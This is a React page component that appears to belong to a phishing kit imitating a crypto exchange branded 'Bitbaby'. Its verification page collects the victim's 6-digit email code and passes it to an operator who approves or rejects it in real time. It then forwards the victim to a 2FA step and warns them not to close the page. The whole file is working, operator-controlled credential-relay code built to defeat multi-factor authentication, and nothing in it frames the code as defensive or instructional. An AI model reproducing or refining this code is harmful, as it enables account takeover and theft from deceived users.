import { trpc } from "@/lib/trpc";
import { Button } from "@/components/ui/button";
import { useLocation } from "wouter";
import { useState, useRef, useEffect } from "react";
import { Loader2 } from "lucide-react";

/**
 * Email Verification Page
 * - Awaits admin command to request email code
 * - Polls for status updates every 2 seconds using tRPC
 * - Shows appropriate messages based on admin action
 */

export default function VerifyEmail() {
  const [, setLocation] = useLocation();
  const [code, setCode] = useState(["", "", "", "", "", ""]);
  const [isWaitingForApproval, setIsWaitingForApproval] = useState(false);
  const [sessionId, setSessionId] = useState<string | null>(null);
  const [lastSeenStatus, setLastSeenStatus] = useState<string | null>(null);
  const [showRejectionError, setShowRejectionError] = useState(false);
  const inputRefs = useRef<(HTMLInputElement | null)[]>([]);

  // Get session ID from URL
  useEffect(() => {
    const params = new URLSearchParams(window.location.search);
    const sid = params.get("sessionId");
    if (sid) {
      setSessionId(sid);
    }
  }, []);

  // tRPC query for polling session status
  const getSessionQuery = trpc.clientData.getSession.useQuery(
    { sessionId: sessionId || "" },
    {
      enabled: !!sessionId,
      refetchInterval: 2000,
      refetchIntervalInBackground: true,
    }
  );

  // Handle session status changes
  useEffect(() => {
    if (!getSessionQuery.data) return;
    
    const newStatus = getSessionQuery.data.status;
    console.log("[VerifyEmail] Session status:", newStatus, "lastSeenStatus:", lastSeenStatus);

    // If code was rejected (transitioned from submitted back to requested), show error message
    if (newStatus === "email_code_requested" && lastSeenStatus === "email_code_submitted") {
      console.log("[VerifyEmail] Code was rejected!");
      setIsWaitingForApproval(false);
      setCode(["", "", "", "", "", ""]);
      setShowRejectionError(true);
      setTimeout(() => setShowRejectionError(false), 3000);
    }
    // If code was approved, redirect to 2FA
    else if (newStatus === "auth_code_requested") {
      console.log("[VerifyEmail] Redirecting to /verification");
      setLocation(`/verification?sessionId=${sessionId}`);
    }
    
    setLastSeenStatus(newStatus);
  }, [getSessionQuery.data, sessionId, setLocation, lastSeenStatus]);

  // Handle individual digit input
  const handleInputChange = (index: number, value: string) => {
    if (!/^\d*$/.test(value)) return;

    const newCode = [...code];
    newCode[index] = value.slice(-1);
    setCode(newCode);

    if (value && index < 5) {
      inputRefs.current[index + 1]?.focus();
    }
  };

  // Handle backspace
  const handleKeyDown = (index: number, e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === "Backspace" && !code[index] && index > 0) {
      inputRefs.current[index - 1]?.focus();
    }
  };

  // Handle paste
  const handlePaste = async () => {
    try {
      const text = await navigator.clipboard.readText();
      const digits = text.replace(/\D/g, "").slice(0, 6).split("");
      
      const newCode = [...code];
      digits.forEach((digit, index) => {
        if (index < 6) {
          newCode[index] = digit;
        }
      });
      setCode(newCode);

      const lastFilledIndex = newCode.findIndex((c) => c === "") - 1;
      if (lastFilledIndex >= 0 && lastFilledIndex < 5) {
        inputRefs.current[lastFilledIndex + 1]?.focus();
      }
    } catch (err) {
      console.error("Failed to read clipboard:", err);
    }
  };

  // Submit email code mutation
  const submitCodeMutation = trpc.clientData.submitEmailCode.useMutation({
    onSuccess: () => {
      setIsWaitingForApproval(true);
    },
    onError: (error) => {
      console.error("Error submitting code:", error);
    },
  });

  // Submit email code
  const handleSubmitCode = async () => {
    if (!sessionId) return;
    
    const fullCode = code.join("");
    if (fullCode.length !== 6) return;

    submitCodeMutation.mutate({
      sessionId,
      code: fullCode,
    });
  };

  // Check if code is complete
  const isCodeComplete = code.every((digit) => digit !== "");
  const sessionStatus = getSessionQuery.data?.status || "pending";

  // Show loading while waiting for approval
  if (isWaitingForApproval) {
    return (
      <div className="min-h-screen bg-black text-white overflow-hidden flex items-center justify-center">
        <div className="text-center space-y-6">
          <div className="flex justify-center">
            <Loader2 className="w-16 h-16 animate-spin text-yellow-400" />
          </div>
          <h1 className="text-3xl md:text-4xl font-bold">Code sent successfully!</h1>
          <p className="text-white/60 text-lg">Waiting for admin validation...</p>
          <div className="flex items-center justify-center gap-2 text-sm text-white/50">
            <div className="w-2 h-2 bg-yellow-400 rounded-full animate-pulse"></div>
            <span>Do not close this page</span>
          </div>
        </div>
      </div>
    );
  }

  // Crypto symbols
  const cryptoSymbols = [
    { symbol: "₿" }, { symbol: "Ξ" }, { symbol: "◆" }, { symbol: "⬡" },
    { symbol: "₿" }, { symbol: "Ξ" }, { symbol: "◆" }, { symbol: "⬡" },
    { symbol: "₿" }, { symbol: "Ξ" }, { symbol: "◆" }, { symbol: "⬡" },
    { symbol: "₿" }, { symbol: "Ξ" },
  ];

  return (
    <div className="min-h-screen bg-black text-white overflow-hidden">
      {/* Header */}
      <header className="fixed top-0 left-0 right-0 z-50 flex items-center justify-between px-4 md:px-8 py-4 md:py-6 bg-black/80 backdrop-blur-sm border-b border-white/5">
        <div className="flex items-center gap-2 md:gap-3">
          <div className="flex items-center gap-1">
            <div className="w-5 h-5 md:w-6 md:h-6 rounded-full bg-yellow-400 flex items-center justify-center text-black font-bold text-xs">●</div>
            <div className="w-5 h-5 md:w-6 md:h-6 rounded-full bg-yellow-400 flex items-center justify-center text-black font-bold text-xs">●</div>
          </div>
          <span className="text-lg md:text-xl font-bold tracking-tight">Bitbaby</span>
        </div>
        <div className="flex items-center gap-2 md:gap-4">
          <button className="w-8 h-8 rounded-full hover:bg-white/10 transition-colors flex items-center justify-center text-lg">
            🌐
          </button>
          <Button className="bg-white text-black hover:bg-gray-100 font-semibold px-4 md:px-6 text-sm md:text-base rounded-lg">
            Sign Up
          </Button>
        </div>
      </header>

      {/* Main Content */}
      <main className="pt-20 md:pt-24 px-4 md:px-8 pb-8 md:pb-0 min-h-screen flex items-center">
        <div className="max-w-7xl mx-auto w-full grid grid-cols-1 md:grid-cols-2 gap-8 md:gap-20 items-center">
          
          {/* Left Side - Crypto Circle */}
          <div className="flex items-center justify-center order-2 md:order-1">
            <div className="relative w-64 h-64 md:w-96 md:h-96">
              <svg className="w-full h-full" viewBox="0 0 400 400" preserveAspectRatio="xMidYMid meet">
                <defs>
                  <radialGradient id="cryptoGradient" cx="50%" cy="50%" r="50%">
                    <stop offset="0%" stopColor="#A0826D" />
                    <stop offset="100%" stopColor="#6B5D52" />
                  </radialGradient>
                  <filter id="cryptoShadow" x="-50%" y="-50%" width="200%" height="200%">
                    <feDropShadow dx="0" dy="4" stdDeviation="3" floodOpacity="0.3" />
                  </filter>
                </defs>

                {cryptoSymbols.map((item, index) => {
                  const angle = (index / cryptoSymbols.length) * Math.PI * 2 - Math.PI / 2;
                  const radius = 130;
                  const x = 200 + radius * Math.cos(angle);
                  const y = 200 + radius * Math.sin(angle);
                  
                  return (
                    <g key={index}>
                      <circle cx={x} cy={y} r="38" fill="url(#cryptoGradient)" filter="url(#cryptoShadow)" opacity="0.85" />
                      <circle cx={x} cy={y} r="38" fill="none" stroke="#FFFFFF" strokeWidth="1" opacity="0.2" />
                      <text x={x} y={y} textAnchor="middle" dominantBaseline="middle" className="font-bold fill-white select-none" fontSize="28" fontWeight="700">
                        {item.symbol}
                      </text>
                    </g>
                  );
                })}

                <text x="200" y="180" textAnchor="middle" dominantBaseline="middle" className="font-semibold fill-white select-none" fontSize="18">
                  We can help you
                </text>
                <text x="200" y="215" textAnchor="middle" dominantBaseline="middle" className="font-bold fill-white select-none" fontSize="26">
                  trade better.
                </text>
              </svg>
            </div>
          </div>

          {/* Right Side - Verification Form */}
          <div className="space-y-6 md:space-y-8 order-1 md:order-2">
            <div>
              <h1 className="text-3xl md:text-5xl font-bold mb-2 tracking-tight">Verify Email</h1>
              <p className="text-white/60">Enter your 6-digit verification code</p>
            </div>

            {/* Status Message */}
            <div className={`p-4 rounded-lg border ${
              sessionStatus === "email_code_requested" 
                ? "bg-green-500/10 border-green-500/30"
                : "bg-blue-500/10 border-blue-500/30"
            }`}>
              {sessionStatus === "pending" && (
                <p className="text-blue-400">⏳ Waiting for admin command...</p>
              )}
              {sessionStatus === "email_code_requested" && (
                <p className="text-green-400">✓ Admin requested email code</p>
              )}
              {sessionStatus === "email_code_submitted" && (
                <p className="text-yellow-400">⏳ Code sent, waiting for validation...</p>
              )}
            </div>
            
            {/* Error Message */}
            {showRejectionError && (
              <div className="p-4 rounded-lg bg-red-500/10 border border-red-500/30">
                <p className="text-red-400">✗ Code rejected! Try again.</p>
              </div>
            )}

            {/* Code Input Fields */}
            {sessionStatus === "email_code_requested" && (
              <div className="space-y-4 animate-fadeIn">
                <div className="flex gap-2 md:gap-3 justify-center">
                  {code.map((digit, index) => (
                    <input
                      key={index}
                      ref={(el) => {
                        inputRefs.current[index] = el;
                      }}
                      type="text"
                      inputMode="numeric"
                      maxLength={1}
                      value={digit}
                      onChange={(e) => handleInputChange(index, e.target.value)}
                      onKeyDown={(e) => handleKeyDown(index, e)}
                      className="w-12 h-12 md:w-14 md:h-14 bg-white/5 border border-white/20 rounded-lg text-white text-center text-2xl font-bold focus:outline-none focus:border-white/50 focus:bg-white/10 transition-all"
                    />
                  ))}
                </div>

                <div className="flex gap-2">
                  <Button
                    onClick={handlePaste}
                    variant="outline"
                    className="flex-1 text-white border-white/20 hover:bg-white/10"
                  >
                    Paste
                  </Button>
                </div>

                <Button
                  onClick={handleSubmitCode}
                  disabled={!isCodeComplete || submitCodeMutation.isPending}
                  className="w-full bg-white text-black hover:bg-gray-100 disabled:bg-gray-400 disabled:cursor-not-allowed font-bold py-2.5 md:py-3 rounded-lg text-base md:text-base transition-colors h-auto"
                >
                  {submitCodeMutation.isPending ? "Sending..." : "Verify Code"}
                </Button>
              </div>
            )}

            {/* Back Button */}
            <Button
              onClick={() => setLocation("/")}
              variant="outline"
              className="w-full text-white border-white/20 hover:bg-white/10"
            >
              Back to Login
            </Button>
          </div>
        </div>
      </main>

      {/* Floating Chat Button */}
      <button className="fixed bottom-6 right-6 md:bottom-8 md:right-8 w-14 h-14 md:w-16 md:h-16 rounded-full bg-gradient-to-br from-cyan-400 to-teal-500 hover:from-cyan-300 hover:to-teal-400 shadow-lg hover:shadow-xl transition-all flex items-center justify-center text-white text-xl md:text-2xl font-bold">
        💬
      </button>
    </div>
  );
}
